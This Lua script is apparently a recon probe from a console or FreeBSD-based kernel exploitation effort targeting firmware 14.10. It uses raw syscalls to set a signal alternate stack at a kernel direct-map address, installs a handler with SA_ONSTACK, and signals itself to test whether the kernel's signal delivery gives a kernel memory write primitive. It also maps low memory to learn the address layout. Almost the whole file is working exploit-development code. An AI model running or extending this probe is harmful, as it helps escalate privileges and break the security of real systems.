-- 14.10 Recon Probe 26f: Kernel altstack crash test
-- Can't read code (XOM), can't create code (W^X no mprotect)
-- Can't block signals (sigprocmask broken)
--
-- BUT: we don't need a clean handler to answer the key question!
-- Set crash handler + kernel altstack + send signal
-- If crash handler RUNS: sendsig() delivered the signal, meaning
--   either it wrote to kernel memory (!!!) or fell back to normal stack
-- If process DIES (disconnect): copyout() rejected kernel addr
--
-- We test with TWO signals back to back:
-- 1. Crash handler + USER altstack → should get binary garbage (baseline)
-- 2. Crash handler + KERNEL altstack → crash test
--
-- Compare: if both produce crash handler output, the kernel falls back.
-- If #2 kills the process, copyout() validates the address.
--
-- IMPORTANT: do the kernel test LAST since it may kill the process

local out = {}
local function log(s) out[#out+1] = s; print(s) end

log("=== 14.10 RECON: KSTACK CRASH TEST ===")
log("fw: " .. tostring(FW_VERSION))
log("pid: " .. syscall.getpid():tonumber())

syscall.resolve({
    sc_sigaction = 416,
    sc_sigaltstack = 53,
    sc_kill = 37,
    sc_getpid = 20,
})

local SA_SIZE = 64
local sa_new = memory.alloc(SA_SIZE)
local sa_old = memory.alloc(SA_SIZE)
local ss_new = memory.alloc(32)
local ss_old = memory.alloc(32)
local pid = syscall.sc_getpid():tonumber()
local STACK_SZ = 32768
local SS_DISABLE = 4

-- ============================================================
-- PART 1: Info gathering — check what we can learn first
-- ============================================================
log("")
log("--- PART 1: memory layout ---")

local heap = memory.alloc(64)
log(string.format("  heap: 0x%x", heap:tonumber()))

-- mmap a few pages to understand the VA layout
syscall.resolve({ sc_mmap = 477, sc_munmap = 73 })
local low_ok, low_ptr = pcall(function()
    return syscall.sc_mmap(0x10000, 4096, 3, 0x1002, -1, 0)
end)
if low_ok then
    log(string.format("  low mmap: 0x%x", low_ptr:tonumber()))
    pcall(function() syscall.sc_munmap(low_ptr, 4096) end)
end

-- ============================================================
-- PART 2: Kernel altstack with crash handler — THE TEST
-- Skip baseline (we know crash handler works on user altstack)
-- Go straight to kernel altstack
--
-- The crash handler (0x533118f4) will try to run. Two outcomes:
-- A) sendsig() builds frame on kernel altstack via copyout()
--    → copyout() succeeds → handler runs on kernel stack → output
--    → THIS MEANS KERNEL WRITE PRIMITIVE
-- B) sendsig() builds frame, copyout() returns EFAULT
--    → kernel kills process → disconnect, no output
-- C) kernel checks altstack addr BEFORE copyout
--    → falls back to regular stack → handler runs → output
--    → this means we can test but no kernel write
-- ============================================================
log("")
log("--- PART 2: KERNEL ALTSTACK TEST ---")
log("  if you see crash handler output after this: sendsig fell back")
log("  if connection drops: copyout rejected kernel addr")

-- Set kernel DMAP altstack
memory.write_dword(ss_new, 0x10000000)
memory.write_dword(ss_new + 4, 0xFFFFF800)
memory.write_qword(ss_new + 8, STACK_SZ)
memory.write_dword(ss_new + 16, 0)

local kss_ok = pcall(function() syscall.sc_sigaltstack(ss_new, ss_old) end)
log("  set kernel altstack: " .. tostring(kss_ok))

-- Verify
pcall(function() syscall.sc_sigaltstack(ss_new, ss_old) end)
local v_lo = memory.read_dword(ss_old):tonumber()
local v_hi = memory.read_dword(ss_old + 4):tonumber()
log(string.format("  verified: 0x%08x%08x", v_hi, v_lo))

-- Set crash handler with SA_ONSTACK
for i = 0, SA_SIZE - 1, 8 do memory.write_qword(sa_new + i, 0) end
memory.write_dword(sa_new, 0x533118f4)
memory.write_dword(sa_new + 4, 0)
memory.write_dword(sa_new + 8, 0x0001 + 0x0040) -- SA_ONSTACK|SA_SIGINFO
pcall(function() syscall.sc_sigaction(30, sa_new, sa_old) end)
log("  handler=0x533118f4 SA_ONSTACK|SA_SIGINFO")

-- Flush output before the dangerous part
log("")
log(">>> SENDING SIGUSR1 WITH KERNEL ALTSTACK <<<")

-- This is the moment of truth
local k_ok, k_ret = pcall(function()
    return syscall.sc_kill(pid, 30)
end)

-- If we reach here, the signal was delivered somehow
log("  *** SURVIVED ***")
log("  kill rv=" .. (k_ok and tostring(k_ret:tonumber()) or "ERR"))

local alive = pcall(function() return syscall.sc_getpid() end)
log("  alive: " .. tostring(alive))

-- If we're still running, it means sendsig() fell back to normal stack
-- (or somehow used the kernel altstack — check for kernel panics later)

-- Check if altstack is still set
local check_ss = memory.alloc(32)
memory.write_dword(ss_new + 16, SS_DISABLE)
pcall(function() syscall.sc_sigaltstack(ss_new, check_ss) end)
local c_lo = memory.read_dword(check_ss):tonumber()
local c_hi = memory.read_dword(check_ss + 4):tonumber()
local c_fl = memory.read_dword(check_ss + 16):tonumber()
log(string.format("  post-signal altstack: 0x%08x%08x flags=0x%x",
    c_hi, c_lo, c_fl))

-- Cleanup
for i = 0, SA_SIZE - 1, 8 do memory.write_qword(sa_new + i, 0) end
pcall(function() syscall.sc_sigaction(30, sa_new, sa_old) end)

log("")
log("=== KSTACK CRASH TEST DONE ===")
log("pid final: " .. syscall.getpid():tonumber())
return table.concat(out, "\n")
